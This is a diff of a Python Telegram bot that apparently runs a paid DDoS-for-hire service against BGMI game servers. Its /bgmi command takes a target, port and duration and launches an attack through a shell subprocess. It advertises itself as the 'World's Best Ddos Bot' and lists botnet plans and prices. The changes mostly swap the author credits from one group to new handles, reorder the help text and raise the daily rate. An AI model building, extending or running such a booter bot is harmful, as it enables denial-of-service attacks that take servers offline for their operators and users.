@@ -1,5 +1,3 @@
-#!/usr/bin/python3
-#By Indian Watchdogs @Indian_Hackers_Team
 
 import telebot
 import subprocess
@@ -208,7 +206,7 @@ def start_attack_reply(message, target, port, time):
     user_info = message.from_user
     username = user_info.username if user_info.username else user_info.first_name
     
-    response = f"{username}, 𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃.\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝: BGMI\nBy Indian Watchdogs @Indian_Hackers_Team"
+    response = f"{username}, 𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃.\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝: BGMI\nBy mr victor and stranger boy"
     bot.reply_to(message, response)
 
 # Dictionary to store the last time each user ran the /bgmi command
@@ -246,9 +244,9 @@ def handle_bgmi(message):
                 subprocess.run(full_command, shell=True)
                 response = f"BGMI Attack Finished. Target: {target} Port: {port} Time: {time}"
         else:
-            response = "Usage :- /bgmi <target> <port> <time>\nBy Indian Watchdogs @Indian_Hackers_Team"  # Updated command syntax
+            response = "Usage :- /bgmi <target> <port> <time>\nBy victor boy @SPIDEYXX33"  # Updated command syntax
     else:
-        response = "You Are Not Authorized To Use This Command.\nBy Indian Watchdogs @Indian_Hackers_Team"
+        response = "You Are Not Authorized To Use This Command.\nBy @SPIDEYXX33"
 
     bot.reply_to(message, response)
 
@@ -278,14 +276,14 @@ def show_command_logs(message):
 @bot.message_handler(commands=['help'])
 def show_help(message):
     help_text = '''Available commands:
+
+     To See Admin Commands:
+ /admincmd : Shows All Admin Commands.
  /bgmi : Method For Bgmi Servers. 
  /rules : Please Check Before Use !!.
  /mylogs : To Check Your Recents Attacks.
- /plan : Checkout Our Botnet Rates.
-
- To See Admin Commands:
- /admincmd : Shows All Admin Commands.
- By Indian Watchdogs @Indian_Hackers_Team
+ /plan : Checkout Our Botnet Rates. 
+ By Indian by victor boy
 '''
     for handler in bot.message_handlers:
         if hasattr(handler, 'commands'):
@@ -300,7 +298,7 @@ def show_help(message):
 @bot.message_handler(commands=['start'])
 def welcome_start(message):
     user_name = message.from_user.first_name
-    response = f"Welcome to Your Home, {user_name}! Feel Free to Explore.\nTry To Run This Command : /help\nWelcome To The World's Best Ddos Bot\nBy Indian Watchdogs @Indian_Hackers_Team"
+    response = f"Welcome to Your Home, {user_name}! Feel Free to Explore.\nTry To Run This Command : /help\nWelcome To The World's Best Ddos Bot\nBy stranger boy and mr victor "
     bot.reply_to(message, response)
 
 
@@ -312,7 +310,7 @@ def welcome_rules(message):
 1. Dont Run Too Many Attacks !! Cause A Ban From Bot
 2. Dont Run 2 Attacks At Same Time Becz If U Then U Got Banned From Bot. 
 3. We Daily Checks The Logs So Follow these rules to avoid Ban!!
-By Indian Watchdogs @Indian_Hackers_Team'''
+By stranger boy and mr victor  '''
     bot.reply_to(message, response)
 
 @bot.message_handler(commands=['plan'])
@@ -326,10 +324,10 @@ Vip :
 -> Concurrents Attack : 300
 
 Pr-ice List:
-Day-->150 Rs
+Day-->300 Rs
 Week-->900 Rs
 Month-->1600 Rs
-By Indian Watchdogs @Indian_Hackers_Team
+By stranger boy and mr victor 
 '''
     bot.reply_to(message, response)
 
@@ -344,7 +342,7 @@ def welcome_plan(message):
 /logs : All Users Logs.
 /broadcast : Broadcast a Message.
 /clearlogs : Clear The Logs File.
-By Indian Watchdogs @Indian_Hackers_Team
+By stranger boy and mr victor 
 '''
     bot.reply_to(message, response)
 
@@ -375,4 +373,4 @@ def broadcast_message(message):
 
 
 bot.polling()
-#By Indian Watchdogs @Indian_Hackers_Team
+#By stranger boy and mr victor 
